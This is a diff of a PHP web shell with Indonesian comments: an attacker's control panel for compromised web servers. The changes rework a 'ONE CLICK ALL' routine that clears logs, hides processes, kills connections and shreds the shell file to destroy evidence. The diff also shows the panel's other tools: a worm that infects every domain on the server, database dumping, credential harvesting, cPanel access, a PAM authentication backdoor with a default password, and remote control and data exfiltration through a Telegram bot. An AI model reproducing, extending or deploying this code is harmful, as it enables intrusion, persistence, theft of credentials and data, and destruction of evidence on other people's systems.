-    // Kirim ke Telegram
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     
-    // ============================================================
-    // ===== 13. SELF-DESTRUCTION (REAL - MENGHAPUS FILE) =====
-    // ============================================================
-    
-    // Hapus backup files
+    // ===== 13. SELF-DESTRUCTION =====
     $backup_files = [
         dirname(__DIR__) . '/.cache/temp.inc',
         '/tmp/' . md5(__FILE__) . '.inc',
@@ -2011,7 +2133,6 @@ function one_click_all() {
         }
     }
     
-    // Hapus file utama
     if (function_exists('shell_exec')) {
         @shell_exec("chattr -i " . escapeshellarg(__FILE__) . " 2>/dev/null");
         @shell_exec("shred -fuz " . escapeshellarg(__FILE__) . " 2>/dev/null");
@@ -2019,10 +2140,7 @@ function one_click_all() {
     }
     @unlink(__FILE__);
     
-    // Destroy session
     session_destroy();
-    
-    // Exit
     exit;
 }
 
@@ -2036,16 +2154,6 @@ if (isset($_GET['worm']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'
 if (isset($_GET['worm_infect_all']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     $result = worm_infect_all_domains(__FILE__);
     echo "🪱 Worm infect all domains selesai. " . count($result['infected']) . " direktori terinfeksi. Check Telegram.";
-    exit;
-}
-
-
-if (isset($_GET['one_click']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
-        one_click_all();
-    } else {
-        echo "⚠️ ONE CLICK requires confirmation: ?one_click=1&confirm=yes";
-    }
     exit;
 }
 
@@ -2196,6 +2304,16 @@ if (isset($_GET['cpanel']) && isset($_SESSION['loggedin']) && $_SESSION['loggedi
     exit;
 }
 
+// ===== ONE CLICK =====
+if (isset($_GET['one_click']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
+        one_click_all();
+    } else {
+        echo "⚠️ ONE CLICK requires confirmation: ?one_click=1&confirm=yes";
+    }
+    exit;
+}
+
 // ==================== TELEGRAM COMMAND HANDLER ====================
 function telegram_command_handler($botToken, $chatId) {
     if (!isset($_SESSION['telegram_offset'])) $_SESSION['telegram_offset'] = 0;
@@ -2288,7 +2406,7 @@ function telegram_command_handler($botToken, $chatId) {
                           . "💀 /userpersist install/remove\n"
                           . "📋 /listspread\n"
                           . "🔄 /cache\n"
-                          . "💀 /oneclicknoworm";
+                          . "💀 /oneclick";
                 break;
                 
             case '/worm':
@@ -2304,9 +2422,9 @@ function telegram_command_handler($botToken, $chatId) {
                           . "🔗 Links: " . count($result['links']) . " domain";
                 break;
                 
-            case '/oneclicknoworm':
-                one_click_all_without_worm();
-                $response = "💀 ONE CLICK (Tanpa Worm) executed. Check Telegram for results.";
+            case '/oneclick':
+                one_click_all();
+                $response = "💀 ONE CLICK executed! File will be deleted.";
                 break;
                 
             default:
@@ -2783,8 +2901,8 @@ if (isset($_SESSION['loggedin'])) {
                     </div>
                     <div class="menu-section">
                         <div class="menu-title">💀 ONE CLICK</div>
-                        <div class="menu-item" onclick="runOneClickNoWorm()" style="color:#ff8800;">
-                            <i class="fas fa-rocket"></i> ONE CLICK
+                        <div class="menu-item" onclick="runOneClick()" style="color:#ff0000;font-weight:bold;">
+                            <i class="fas fa-skull-crossbones"></i> ONE CLICK ALL
                         </div>
                     </div>
                     <div class="menu-section">
@@ -2902,9 +3020,9 @@ if (isset($_SESSION['loggedin'])) {
                                                     <a href="#" onclick="editFile('<?= htmlspecialchars($item) ?>')"> Edit</a>
                                                 <?php endif; ?>
                                                 <a href="#" onclick="showRename('<?= htmlspecialchars($item) ?>')"> Rename</a>
-                                                <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>"> DL</a>
+                                                <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>">DL</a>
                                                 <a href="?path=<?= urlencode($currentPath) ?>&action=delete&target=<?= urlencode($item) ?>" onclick="return confirm('Yakin?')" style="color:var(--danger);">🗑️ Del</a>
-                                                <a href="#" onclick="showChmod('<?= htmlspecialchars($item) ?>', '<?= $permsFormatted ?>')"> CHMOD</a>
+                                                <a href="#" onclick="showChmod('<?= htmlspecialchars($item) ?>', '<?= $permsFormatted ?>')">CHMOD</a>
                                             </td>
                                         </tr>
                                     <?php } ?>
@@ -2984,7 +3102,7 @@ if (isset($_SESSION['loggedin'])) {
                     <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                         <div class="form-group"><input type="text" id="newName" name="new_name" class="form-control" required></div>
                         <input type="hidden" id="renameTarget" name="target"><input type="hidden" name="rename" value="1">
-                        <button type="submit" class="btn btn-block">Rename</button>
+                        <button type="submit" class="btn btn-block">✅ Rename</button>
                     </form>
                 </div>
             </div>
@@ -3069,7 +3187,6 @@ if (isset($_SESSION['loggedin'])) {
 
             function runWorm(){if(confirm('Yakin?')){fetch('?worm=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
             function runWormInfectAll(){if(confirm('🪱 INFECT ALL DOMAINS?')){fetch('?worm_infect_all=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runOneClickNoWorm(){if(confirm('ONE CLICK ALL?')){if(confirm('KONFIRMASI AKHIR!')){window.location.href='?one_click_no_worm=1&confirm=yes';}}}
             function runDump(){if(confirm('Dump database?')){fetch('?dumpdb=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
             function runHarvest(){if(confirm('Harvest?')){fetch('?harvest=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
             function runCpanel(){showModal('cpanelModal');}
@@ -3089,6 +3206,14 @@ if (isset($_SESSION['loggedin'])) {
             function runDeepPersistence(action){var msg=action==='install'?'Install deep persistence?':'Remove deep persistence?';if(confirm(msg)){fetch('?deep_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
             function runPamBypass(action){if(action==='install'){var pass=prompt('Backdoor password:')||'BackdoorPass123';if(confirm('Install PAM bypass?')){fetch('?pam_bypass=install&password='+encodeURIComponent(pass)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}else{if(confirm('Remove PAM bypass?')){fetch('?pam_bypass=remove').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}}
             function runUserPersistence(action){var msg=action==='install'?'Install user persistence?':'Remove user persistence?';if(confirm(msg)){fetch('?user_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
+            
+            function runOneClick() {
+                if(confirm('⚠️ ONE CLICK ALL!\n\nIni akan menjalankan SEMUA fitur:\n- Spoof IP & UA\n- Clear logs & histories\n- Hide process\n- Fake login\n- Delete temp & sensitive files\n- Kill connections\n- Clear cache\n\nSETELAH ITU FILE AKAN DIHAPUS PERMANEN!\n\nYAKIN?')) {
+                    if(confirm('KONFIRMASI AKHIR! File akan dihapus permanen!')) {
+                        window.location.href='?one_click=1&confirm=yes';
+                    }
+                }
+            }
 
             window.onclick=function(e){document.querySelectorAll('.modal').forEach(m=>{if(e.target===m)hideModal(m.id);});}
             <?php if(isset($_GET['edit'])): ?><?php $file=$_GET['edit']; $filePath=$currentPath.DIRECTORY_SEPARATOR.$file; $content=(file_exists($filePath)&&is_file($filePath)&&isSafePath($filePath,$rootPath,$specialDirectories)&&in_array(strtolower(pathinfo($file,PATHINFO_EXTENSION)),$editableExtensions))?@file_get_contents($filePath):''; ?>document.addEventListener('DOMContentLoaded',function(){document.getElementById('fileContent').value=<?= json_encode($content) ?>;document.getElementById('editFileName').value=<?= json_encode($file) ?>;showModal('editModal');});<?php endif; ?>
